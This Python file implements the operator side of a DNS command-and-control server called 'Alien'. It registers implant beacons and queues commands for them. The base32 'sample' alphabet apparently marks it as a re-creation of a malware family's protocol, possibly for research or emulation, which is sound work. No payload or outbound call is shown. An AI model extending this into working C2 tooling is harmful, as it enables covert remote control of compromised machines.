import logging
import math
import random
import socket

from Alien.beacon import AlienBeacon
from Alien.utilities.communication import BeaconResult, DnsPair, ResultCodes
from Alien.utilities.encodings import BASE32_ALPHABET_OF_SAMPLE, decode_str_into_int

FIRSTALIVEKEY = "simpsons"

LENGTH_OF_FIRST_KEY = len(FIRSTALIVEKEY) + 1

logger = logging.getLogger("dns_c2")

class Alien:
    def __init__(self, c2_domains):
        self.c2_domains = c2_domains
        self.beacons = []
        self.commands_upon_checkin = []

    def log(self, message, loglevel=logging.INFO):
        logger.log(level=loglevel, msg=f"[Alien] {message}")

    def add_beacon(self, beacon: AlienBeacon):
        self.log(f"Beacon check-in (ID {beacon.id})")
        self.beacons.append(beacon)
        for command in self.commands_upon_checkin:
            self.schedule_task(beacon.id, command)

    def handle_command_result(self, beacon, data):
        self.log(f"[Beacon {beacon.id}] : {data}")

    def schedule_task_for_new_beacons(self, command):
        self.commands_upon_checkin.append(command)

    def schedule_task(self, beacon_id, command):
        beacon = next((b for b in self.beacons if b.id == beacon_id), None)
        if beacon is not None:
            beacon.command_queue.append(command)
            self.log(
                f"Tasked beacon {beacon_id} with command "
                f"{command!r}",
            )
            return True

        self.log(f"Could not schedule task for beacon {beacon_id}: not found.", logging.WARNING)
        return False
